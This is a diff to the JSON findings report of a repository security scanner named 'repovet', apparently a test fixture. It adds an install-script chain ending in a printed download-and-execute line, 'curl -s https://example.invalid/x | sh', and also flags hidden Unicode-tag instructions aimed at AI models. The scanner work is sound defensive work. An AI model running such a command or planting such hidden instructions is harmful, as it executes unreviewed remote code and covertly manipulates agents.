@@ -1,5 +1,5 @@
 {
-  "schema_version": "1.3",
+  "schema_version": "1.4",
   "tool": {
     "name": "repovet",
     "version": "0.1.0"
@@ -15,17 +15,18 @@
     "min_severity": "info"
   },
   "summary": {
-    "findings": 5,
+    "findings": 7,
+    "part_of_chains": 2,
     "hidden_below_min_severity": 0,
     "by_severity": {
       "critical": 1,
-      "high": 2,
-      "medium": 1,
+      "high": 3,
+      "medium": 0,
       "low": 1,
-      "info": 0
+      "info": 2
     },
     "by_category": {
-      "danger": 4,
+      "danger": 6,
       "trust": 1,
       "provenance": 0
     }
@@ -48,7 +49,46 @@
       "rationale": "Unicode tag characters are invisible in editors and on GitHub, but AI models read them as text and may follow hidden instructions in them.",
       "recommendation": "Read it first.",
       "references": [],
-      "context": null
+      "context": null,
+      "chain": null,
+      "in_chain": null
+    },
+    {
+      "rule_id": "RC-AUTO-090",
+      "title": "Title",
+      "category": "danger",
+      "area": "autorun",
+      "severity": "high",
+      "confidence": "high",
+      "location": {
+        "path": "package.json",
+        "line": 3,
+        "column": null
+      },
+      "message": "npm install script runs on install and reaches download-and-execute (RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh",
+      "evidence": "curl -s https://example.invalid/x | sh",
+      "rationale": "Because tools run this automatically.",
+      "recommendation": "Read it first.",
+      "references": [],
+      "context": null,
+      "chain": {
+        "id": "chain-1",
+        "steps": [
+          {
+            "path": "package.json",
+            "line": 3
+          },
+          {
+            "path": "x.js",
+            "line": null
+          },
+          {
+            "path": "x.sh",
+            "line": 2
+          }
+        ]
+      },
+      "in_chain": null
     },
     {
       "rule_id": "RC-AGENT-020",
@@ -67,7 +107,9 @@
       "rationale": "Because tools run this automatically.",
       "recommendation": "Read it first.",
       "references": [],
-      "context": "test"
+      "context": "test",
+      "chain": null,
+      "in_chain": null
     },
     {
       "rule_id": "RC-AGENT-020",
@@ -86,7 +128,9 @@
       "rationale": "Because tools run this automatically.",
       "recommendation": "Read it first.",
       "references": [],
-      "context": "test"
+      "context": "test",
+      "chain": null,
+      "in_chain": null
     },
     {
       "rule_id": "RC-AUTO-001",
@@ -105,7 +149,30 @@
       "rationale": "Because tools run this automatically.",
       "recommendation": "Read it first.",
       "references": [],
-      "context": null
+      "context": null,
+      "chain": null,
+      "in_chain": "chain-1"
+    },
+    {
+      "rule_id": "RC-DLX-001",
+      "title": "Title",
+      "category": "danger",
+      "area": "download_exec",
+      "severity": "medium",
+      "confidence": "high",
+      "location": {
+        "path": "x.sh",
+        "line": 2,
+        "column": null
+      },
+      "message": "Downloads and runs code in one step: curl -s https://example.invalid/x | sh",
+      "evidence": "curl -s https://example.invalid/x | sh",
+      "rationale": "Because tools run this automatically.",
+      "recommendation": "Read it first.",
+      "references": [],
+      "context": null,
+      "chain": null,
+      "in_chain": "chain-1"
     },
     {
       "rule_id": "RC-TRUST-001",
@@ -120,7 +187,51 @@
       "rationale": "Because tools run this automatically.",
       "recommendation": "Read it first.",
       "references": [],
-      "context": null
+      "context": null,
+      "chain": null,
+      "in_chain": null
+    },
+    {
+      "rule_id": "RC-AGENT-001",
+      "title": "AI agent file present",
+      "category": "danger",
+      "area": "agents",
+      "severity": "info",
+      "confidence": "high",
+      "location": {
+        "path": "AGENTS.md",
+        "line": null,
+        "column": null
+      },
+      "message": "AI agent file: AGENTS.md",
+      "evidence": null,
+      "rationale": "Because tools run this automatically.",
+      "recommendation": "Read it first.",
+      "references": [],
+      "context": null,
+      "chain": null,
+      "in_chain": null
+    },
+    {
+      "rule_id": "RC-AGENT-001",
+      "title": "AI agent file present",
+      "category": "danger",
+      "area": "agents",
+      "severity": "info",
+      "confidence": "high",
+      "location": {
+        "path": "CLAUDE.md",
+        "line": null,
+        "column": null
+      },
+      "message": "AI agent file: CLAUDE.md",
+      "evidence": null,
+      "rationale": "Because tools run this automatically.",
+      "recommendation": "Read it first.",
+      "references": [],
+      "context": null,
+      "chain": null,
+      "in_chain": null
     }
   ],
   "coverage": [
